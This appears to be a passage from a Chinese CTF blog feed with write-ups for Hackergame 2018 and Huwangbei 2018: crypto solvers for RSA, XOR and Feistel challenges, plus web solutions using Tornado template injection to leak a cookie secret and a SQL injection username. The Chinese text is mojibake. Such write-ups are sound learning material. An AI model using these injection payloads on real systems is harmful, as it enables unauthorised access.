class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> difflib</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">a=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">There is something in this world</span></span><br><span class="line"><span class="string">that no one has ever seen before.</span></span><br><span class="line"><span class="string">It is gentle and sweet.</span></span><br><span class="line"><span class="string">Maybe if it could be seen,</span></span><br><span class="line"><span class="string">everyone would fight over it.</span></span><br><span class="line"><span class="string">That is why the world hid it,</span></span><br><span class="line"><span class="string">so that no one could get their hands</span></span><br><span class="line"><span class="string">on it so easily.</span></span><br><span class="line"><span class="string">However, someday, someone will find it.</span></span><br><span class="line"><span class="string">The person who deserves it the most</span></span><br><span class="line"><span class="string">will definitely find it.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">Do you like this school?</span></span><br><span class="line"><span class="string">I really, really love it.</span></span><br><span class="line"><span class="string">But nothing can stay unchanged.</span></span><br><span class="line"><span class="string">Fun things... Happy things...</span></span><br><span class="line"><span class="string">They can&#x27;t all possibly stay unchanged.</span></span><br><span class="line"><span class="string">Even so,</span></span><br><span class="line"><span class="string">can you go on loving this place?</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">Sometimes I wonder,</span></span><br><span class="line"><span class="string">what if this town was alive?</span></span><br><span class="line"><span class="string">What if it had thoughts and feelings</span></span><br><span class="line"><span class="string">like one of us?</span></span><br><span class="line"><span class="string">If it did,</span></span><br><span class="line"><span class="string">I think it would want to make the people</span></span><br><span class="line"><span class="string">who live here happy.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">Expectations are what you have</span></span><br><span class="line"><span class="string">when you have given up.</span></span><br><span class="line"><span class="string">Expectations are born from</span></span><br><span class="line"><span class="string">a despairingly large difference in skill.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">A joke only lasts for a moment,</span></span><br><span class="line"><span class="string">if it leaves a misunderstanding,</span></span><br><span class="line"><span class="string">it becomes a lie.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">If someone didn&#x27;t have any pride,</span></span><br><span class="line"><span class="string">wouldn&#x27;t they also be lacking</span></span><br><span class="line"><span class="string">in self-confidence?</span></span><br><span class="line"><span class="string">If someone was free of greed,</span></span><br><span class="line"><span class="string">wouldn&#x27;t they have trouble</span></span><br><span class="line"><span class="string">supporting their family?</span></span><br><span class="line"><span class="string">And if people didn&#x27;t envy one another,</span></span><br><span class="line"><span class="string">wouldn&#x27;t they stop inventing new things?</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">If I don&#x27;t have to do it, I won&#x27;t.</span></span><br><span class="line"><span class="string">If I have to do it, I&#x27;ll make it.</span></span><br><span class="line"><span class="string">---------</span></span><br><span class="line"><span class="string">/* Here is the end of my poem.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a=a.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">b=<span class="string">&quot;---------There is something in this worldfthat no one has ever seen before.It is gentle and sweet.lMaybe if it could be seen,aeveryone would fight over it.gThat is why the world hid it,&#123;so that no one could get their handson it so easily.STHowever, someday, someone will find it.The person who deserves it the mostewill definitely find it.---------Do you like this school?I really, really love it.gABut nothing can stay unchanged.n0Fun things... Happy things...gThey can&#x27;t all possibly stay unchanged.Even so,rcan you go on loving this place?A---------Sometimes I wonder,Phwhat if this town was alive?y_What if it had thoughts and feelingslike one of us?If it did,w1I think it would want to make the peopletHwho live here happy._---------Expectations are what you havewhen you have given up.uExpectations are born fromUa despairingly large difference in skill.e---------A joke only lasts for a moment,Ncif it leaves a misunderstanding,0it becomes a lie.D---------If someone didn&#x27;t have any pride,wouldn&#x27;t they also be lackingEin self-confidence?_IIf someone was free of greed,5wouldn&#x27;t they have trouble_supporting their family?And if people didn&#x27;t envy one another,5wouldn&#x27;t they stop inventing new things?0_---------If I don&#x27;t have to do it, I won&#x27;t.fuIf I have to do it, I&#x27;ll make it.---------/* Here is the end of my poem.&quot;</span></span><br><span class="line">d = difflib.Differ()</span><br><span class="line">diff = <span class="built_in">list</span>(d.compare(a,b))</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> diff:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]==<span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        flag+=line</span><br><span class="line">flag=flag.replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ flag æ˜¯: flag{STegAn0grAPhy_w1tH_uUeNc0DE_I5_50_fu</p><p>ç¼ºäº†ç‚¹ä»€ä¹ˆï¼Œåé¢è¡¥ä¸€ä¸‹â€n}â€ bingo!</p><blockquote><p>flag{STegAn0grAPhy_w1tH_uUeNc0DE_I5_50_fun}</p></blockquote><h3 id="Z-åŒå­¦çš„-RSA"><a href="#Z-åŒå­¦çš„-RSA" class="headerlink" title="Z åŒå­¦çš„ RSA"></a>Z åŒå­¦çš„ RSA</h3><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">p = sympy.randprime(<span class="number">2</span> ** <span class="number">1023</span>, <span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line">q = sympy.randprime(<span class="number">2</span> ** <span class="number">1023</span>, <span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">a = (p * q) ^ (p + q)</span><br><span class="line">b = (p * q) ^ (p - q)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(a, b, <span class="built_in">pow</span>(m, <span class="number">65537</span>, p * q))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢˜ç›®åªæä¾›äº† p å’Œ q ä»¥åŠå¯†æ–‡ï¼Œp å’Œ q éƒ½æ˜¯ 1024bitï¼Œæˆ‘ä»¬è¦æ ¹æ® a å’Œ b æ¥æ±‚ç§é’¥ã€‚å› ä¸ºç»™çš„éƒ½æ˜¯å¼‚æˆ–è¿ç®—çš„ç»“æœï¼Œéš¾ä»¥é€šè¿‡æ•°å­¦å˜æ¢å¾—åˆ°ã€‚</p><p>è¿™é‡Œç”¨åˆ°çš„æ˜¯é€æ¯”ç‰¹çŒœè§£çš„æ€æƒ³ï¼Œä»ä½ä½å‘é«˜ä½çŒœè§£ã€‚å¯¹äº a å’Œ b çš„æœ€ä½ n ä¸ª bit ä½ï¼Œåªå’Œ p å’Œ q çš„æœ€ä½ n ä¸ªä½æœ‰å…³ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ a å’Œ b çš„æœ€ä½ä½æ¥éªŒè¯ p å’Œ q æ˜¯å¦æ»¡è¶³è¦æ±‚ã€‚</p><p>å¯¹äºæ¯ä½ï¼Œp å’Œ q å°±å››ç§å¯èƒ½ï¼š<code>(0,0) (0,1) (1,0) (1,1)</code> æˆ‘ä»¬ä»æœ€åç¬¬ä¸€ä½å¼€å§‹å°è¯•ï¼Œæ»¡è¶³è¦æ±‚çš„ç»„åˆæ”¾å…¥å€™é€‰åˆ—è¡¨é‡Œï¼Œå¯¹äºå€™é€‰åˆ—è¡¨çš„æ¯é¡¹ï¼ŒéªŒè¯é«˜ä¸€ä½æ—¶åˆä¼šåˆ†å‡ºå››ç§æƒ…å†µï¼ŒåŒæ ·è¿›è¡ŒéªŒè¯ï¼Œæ›´æ–°å€™é€‰åˆ—è¡¨ï¼ŒæŠŠç¬¦åˆè¦æ±‚çš„æ”¾å…¥åˆ—è¡¨é‡Œï¼Œä»¥æ­¤ç±»æ¨ã€‚æœ€åæ‰¾åˆ°æ»¡è¶³ a å’Œ b æ‰€æœ‰ bit ä½çš„ p å’Œ qã€‚</p><p>å¯ä»¥çœ‹ä¸€ä¸‹ wiki çš„ç›¸å…³èµ„æ–™ï¼š<br><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/lcg/challenge/">https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/lcg/challenge/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">a=<span class="number">20177650286553319048656572431426864683972322616537528728644836950907654167144961938429509778926505938147163259147328872178897507791522569632637628576826135964471897661414351261453774090509205324220367785291196302551202990322952833839519685942136552490589504983264090018782888509594899124308485994909369157739590678421913334422763356613026472743079024933233557565198057398238454462971661266735075199307328588913060033329742394868127944469289321187036511972057975816136466581904044150309083660596527476198646767207896234322280486096803109351478982849399252765905154625449629131202246956928879278104313464399748896654335</span></span><br><span class="line">b=<span class="number">-20177650286553319048656572431426864683972322616537528728644836950907654167144961938429509778926505938147163259147328872178897507791522569632637628576826135964471897661414351261453774090509205324220367785291196302551202990322952833839519685942136552490589504983264090018782888509594899124308485994909369157739690798236942786515359420891819523078078001184938002588184640997371794236705658312351156161124668283889171041058024858239408724965303885485356611059740480075879221661858319606783376958758348179998879989787088907672913468336293174408246405953882533580841784122100084676690051777413318254860735992696612183461891</span></span><br><span class="line">c=<span class="number">13366903717795173429187761381567634048063984815133198408928503123602872647318097072713914639532980123537673828080136443096769208675278048903846468093331645356496756288494505939828792144555809683756644579691988377803769792505153509199204570978899052097185497377390921828391436597604626534413078392906362225675998274015504081511064143613477551873256333146732640157434336327576006467405800870704016822007754775192350360613102361780884075519253676949699170275909029570177548059093617965631063061181238396995096224186949430603966487712969428525308725462401758888441403291459307185920723957045088801754933390532219059494721</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f1 = <span class="keyword">lambda</span> p, q: (p * q) ^ (p + q)</span><br><span class="line">f2 = <span class="keyword">lambda</span> p, q: (p * q) ^ (p - q)</span><br><span class="line"></span><br><span class="line">candidates = &#123;(<span class="number">0</span>, <span class="number">0</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1025</span>):</span><br><span class="line">    print(m, <span class="built_in">len</span>(candidates))</span><br><span class="line">    candidates_ = <span class="built_in">set</span>()</span><br><span class="line">    mask = (<span class="number">2</span> &lt;&lt; m) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> candidates:</span><br><span class="line">        <span class="keyword">for</span> bx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> by <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                xx = x + (bx &lt;&lt; m)</span><br><span class="line">                yy = y + (by &lt;&lt; m)</span><br><span class="line">                <span class="keyword">if</span> f1(xx, yy) &amp; mask != a &amp; mask:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> f2(xx, yy) &amp; mask != b &amp; mask:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                candidates_.add((xx, yy))</span><br><span class="line">    candidates = candidates_</span><br><span class="line"><span class="keyword">for</span> x, y <span class="keyword">in</span> candidates:</span><br><span class="line">    <span class="keyword">if</span> f1(x, y) == a <span class="keyword">and</span> f2(x, y) == b:</span><br><span class="line">        p, q = x, y</span><br><span class="line">        d = gmpy2.invert(<span class="number">65537</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, p * q)</span><br><span class="line">        print(libnum.n2s(m))</span><br><span class="line">        exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{Z_loves_RSA_and_maths~!:)}</p></blockquote><p>å‚è€ƒï¼š <code>https://github.com/ustclug/hackergame2018-writeups/blob/master/official/RSA_of_Z/README.md</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 æŠ¤ç½‘æ¯ wp</title>
      <link href="/2018/10/15/2018-%E6%8A%A4%E7%BD%91%E6%9D%AF/"/>
      <url>/2018/10/15/2018-%E6%8A%A4%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>å†ä¸€æ¬¡è§‚çœ‹äº†ä¸€æ³¢ç¥ä»™æ‰“æ¶ã€‚</p><a id="more"></a><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="è¿Ÿæ¥çš„ç­¾åˆ°é¢˜"><a href="#è¿Ÿæ¥çš„ç­¾åˆ°é¢˜" class="headerlink" title="è¿Ÿæ¥çš„ç­¾åˆ°é¢˜"></a>è¿Ÿæ¥çš„ç­¾åˆ°é¢˜</h4><p>é¢˜ç›®æç¤º easy xor,æ‰“å¼€é™„ä»¶æ˜¯ä¸€ä¸² base64:</p><blockquote><p>AAoHAR1QUiBTJVBQI1RVIl5WJVInUlNWIFZUX1ZRJ1dWU1dfURs=</p></blockquote><p>è§£ç æ˜¯ä¹±ç ã€‚<br>çŒœæƒ³æ€è·¯å’Œ CSAW å¯†ç ç¬¬ä¸€é¢˜ä¸€æ¨¡ä¸€æ ·ï¼Œå†™å‡ºè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">ciphertext=<span class="string">&quot;AAoHAR1QUiBTJVBQI1RVIl5WJVInUlNWIFZUX1ZRJ1dWU1dfURs=&quot;</span></span><br><span class="line">cipher=base64.b64decode(ciphertext)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">        result+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s)^i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span> result</span><br></pre></td></tr></table></figure><blockquote><p>flag{64F5C66E23D80C4A450F02907A105197}</p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="fez"><a href="#fez" class="headerlink" title="fez"></a>fez</h4><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(a)==<span class="built_in">len</span>(b)</span><br><span class="line">    c=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        c+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])^<span class="built_in">ord</span>(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x,k</span>):</span></span><br><span class="line">    <span class="keyword">return</span> xor(xor(x,k),<span class="number">7</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span>(<span class="params">M,K</span>):</span></span><br><span class="line">    L=M[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">    R=M[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">    new_l=R</span><br><span class="line">    new_r=xor(xor(R,L),K)</span><br><span class="line">    <span class="keyword">return</span> new_l+new_r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fez</span>(<span class="params">m,K</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">        m=<span class="built_in">round</span>(m,i)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">K=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    K.append(os.urandom(<span class="number">27</span>))</span><br><span class="line">m=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(m)&lt;<span class="number">54</span></span><br><span class="line">m+=os.urandom(<span class="number">54</span>-<span class="built_in">len</span>(m))</span><br><span class="line"></span><br><span class="line">test=os.urandom(<span class="number">54</span>)</span><br><span class="line"><span class="built_in">print</span> test.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> fez(test,K).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> fez(m,K).encode(<span class="string">&quot;hex&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç»™å‡ºäº†ä¸‰ç»„ print çš„ç»“æœï¼Œåˆ†æåŠ å¯†è¿‡ç¨‹æ˜¯ feistel å¯†ç ç»“æ„ï¼Œè¿­ä»£äº†ä¸ƒè½®ï¼Œå…¨éƒ¨ä¸ºå¼‚æˆ–ï¼Œå³ç»™å®šæ˜æ–‡ L+R(æ˜æ–‡åˆ†æˆä¸¤éƒ¨åˆ†)ï¼Œæœ€ååŠ å¯†çš„ç»“æœæ˜¯ï¼š</p><blockquote><p>L_enc: R xor K1<br>R_enc: L xor R xor K2</p></blockquote><p>é¢˜ç›®ç»™å‡ºäº† test å’Œ test åŠ å¯†çš„ç»“æœï¼Œå¯ä»¥è®¡ç®—å‡º K1 å’Œ K2ï¼Œç„¶ååˆ©ç”¨ flag å¯†æ–‡å·¦åŠéƒ¨åˆ†ç®—å‡º flagæ˜æ–‡çš„å³åŠéƒ¨åˆ†ï¼Œè¿›è€Œå¾—åˆ° flagã€‚</p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(a)==<span class="built_in">len</span>(b)</span><br><span class="line">    c=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        c+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])^<span class="built_in">ord</span>(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">test=<span class="string">&quot;2315d80c2dd73098953686be6c82aa63c1d362eb0095e4621cce28bec4c921ce016afc7f39fd93b14b6c28ce69c7096b91fd2db0862d&quot;</span></span><br><span class="line">test_enc=<span class="string">&quot;308e590a180473ab4d23a0c67b65fe2bf2d0a9f1b255e4e2610b0c90e8e210c8ed4f2b9a3b09c1886a781f94fee4f77488c0b30f2395&quot;</span></span><br><span class="line">flag_enc=<span class="string">&quot;e822e918e578a7af4f0859a99aab5d7563644beb4207a73d5fc4560d3deb696320cec479431a4f724310499baf5230db7e56764915d0&quot;</span></span><br><span class="line">test=test.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">test_enc=test_enc.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">flag_enc=flag_enc.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line">k1=xor(test[<span class="number">27</span>:<span class="number">54</span>],test_enc[<span class="number">0</span>:<span class="number">27</span>])</span><br><span class="line">k2=xor(xor(test[<span class="number">27</span>:<span class="number">54</span>],test[<span class="number">0</span>:<span class="number">27</span>]),test_enc[<span class="number">27</span>:<span class="number">54</span>])</span><br><span class="line">flag_r=xor(k1,flag_enc[<span class="number">0</span>:<span class="number">27</span>])</span><br><span class="line">flag_l=xor(flag_r,xor(k2,flag_enc[<span class="number">27</span>:<span class="number">54</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag_l+flag_r</span><br></pre></td></tr></table></figure><blockquote><p>flag{festel_weak_666_11xd77fhy33}</p></blockquote><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>é¢˜ç›®æ‰“å¼€æœ‰ä¸‰ä¸ªé€‰é¡¹ï¼š</p><blockquote><p>Orz.txt è¿›å»æç¤ºæ˜¯ <strong>render()</strong><br>hint.txt è¿›å»æç¤ºæ˜¯ <strong>md5(cookie_secret + md5(filename))</strong><br>flag.txt è¿›å»æç¤ºæ˜¯ <strong>/fllllllllllag</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url æ ¼å¼ï¼š http:&#x2F;&#x2F;117.78.26.200:31031&#x2F;file?filename&#x3D;hint.txt&amp;signature&#x3D;74dfcb55b94ddbe4daedd3f21a68a2f</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåº”è¯¥å°±æ˜¯è¯» /fllllllllllag äº†ï¼Œä½†æ˜¯è¿™é‡Œçš„ cookie_secret ä¸çŸ¥é“ã€‚<br>æœ‰ä¸€ä¸ªæç¤ºæ˜¯ render()ï¼Œæ‰€ä»¥åº”è¯¥å­˜åœ¨ SSTIï¼Œå°è¯•ç”¨<strong>/error?msg=1</strong>ï¼Œå‘ç°å¯ä»¥ã€‚ä½†æ˜¯è¿‡æ»¤äº†ç›¸å½“å¤šçš„å­—ç¬¦ï¼Œæ— æ³•ç›´æ¥è¯»åˆ° cookie_secret è¿™ä¸ªå˜é‡ã€‚</p><p>å°è¯•äº†ä¸€æ³¢ç»•è¿‡å§¿åŠ¿ï¼Œæ— æœã€‚åº”è¯¥æ˜¯åˆ©ç”¨ tornado æ¡†æ¶åˆ«çš„æ–¹å¼è¯»å– cookie_secretã€‚</p><p>åœ¨<a href="https://tornado-zh.readthedocs.io/zh/latest/web.html">è¿™ç¯‡æ–‡ç« </a>ä¸­å‘ç° cookie_secret å­˜äºhandler çš„ settings ä¸­ï¼Œæ‰€ä»¥æ„é€  payload: <a href="http://117.78.26.200:31031/error?msg=">http://117.78.26.200:31031/error?msg=</a>ï¼Œå¾—åˆ° cookie_secret:</p><blockquote><p>â€˜cookie_secretâ€™: g!E#Ax&amp;_ywJ[d1BRWe5U?qa^@u4pIh&lt;M$sTr0VL2t*3CKzv7mb]S-c8&gt;X)G.lYDQ</p></blockquote><p>æœ‰äº† cookie_secret,filename è®¾æˆ /fllllllllllagï¼Œåˆ©ç”¨é‚£ä¸ªåµŒå¥— md5 ç”Ÿæˆç­¾åå»è®¿é—®ï¼Œpayload:<code>http://117.78.26.200:31031/file?filename=/fllllllllllag&amp;signature=a0e8913e76b38d61f13cb22ba8d59cf5</code></p><p>å¾—åˆ° flagï¼š</p><blockquote><p>flag{975596d6031dd373b313acc910a6891f}</p></blockquote><h4 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h4><p>ç»“æŸåå¬å¸ˆå‚…ä»¬è¯´æ˜¯æ¡ä»¶ç«äº‰å’Œ mysql çš„æ•´æ•°æº¢å‡ºï¼Œç­‰ä¸€æ³¢ docker å¤ç°â€¦.</p><h4 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h4><p>è·Ÿç€å¸ˆå‚…ä»¬çš„ wp å¤ç°äº†ä¸€æ³¢ï¼Œemmmmmm ä¸å¾—ä¸è¯´è¿™ä¸ªé¢˜èµ·å easy_laravelï¼Œå¯ä»¥ç»™å‡ºé¢˜äººå¯„åˆ€ç‰‡äº†ã€‚ç°åœ¨ webä¸€ä¸ªé¢˜ä¸€ä¸ªæ¡†æ¶ï¼Œæ‰“ä¸åŠ¨æ‰“ä¸åŠ¨â€¦</p><blockquote><p>github ä¸Šçš„ docker åœ°å€ï¼š<code>https://github.com/sco4x0/huwangbei2018_easy_laravel</code></p></blockquote><p>ç½‘é¡µæºä»£ç ç»™äº†æºç åœ°å€ï¼š <code>https://github.com/qqqqqqvq/easy_laravel</code>.</p><p>æ³¨å†Œä¸€ä¸‹ï¼Œè¿›å»å‘ç°åªæœ‰ä¸€ä¸ª noteï¼Œè¿˜æ˜¯ç©ºçš„ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a5f3d9062acfbde9.png" alt="image.png"></p><p>çœ‹ä¸€æ³¢æºç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-53b80b300e5a3adf.png" alt="image.png"></p><p>æ‰¾åˆ°äº†ç®¡ç†å‘˜çš„åå­—å’Œé‚®ç®±ï¼Œä½†æ˜¯å¯†ç æ˜¯éšæœº 40 ä½ï¼Œç ´è§£æ˜¯ä¸å¯èƒ½äº†ã€‚</p><p>çœ‹ä¸€ä¸‹è·¯ç”±ï¼Œå‘ç°åªæœ‰ note åŠŸèƒ½æ˜¯éç®¡ç†å‘˜å¯ä»¥è®¿é—®ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-58450c3f94781c85.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè¦ç®¡ç†å‘˜èº«ä»½ç™»è¿›å»ã€‚</p><p>çœ‹ä¸€ä¸‹ note æ§åˆ¶å™¨ <strong>NoteController</strong>ï¼Œå‘ç°å­˜åœ¨æ³¨å…¥ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-78ac55922401c9d9.png" alt="image.png"></p><p>æ‰€ä»¥æ„é€  <strong>adminâ€™or 1#</strong> æ³¨å†Œï¼Œç™»è¿›å»ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-71bf980bbd6b3a8f.png" alt="image.png"></p><p>å†çœ‹çœ‹å¯†ç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c9142c44b45cc805.png" alt="image.png"></p><p>ä½†æ˜¯æ— æ³•ç 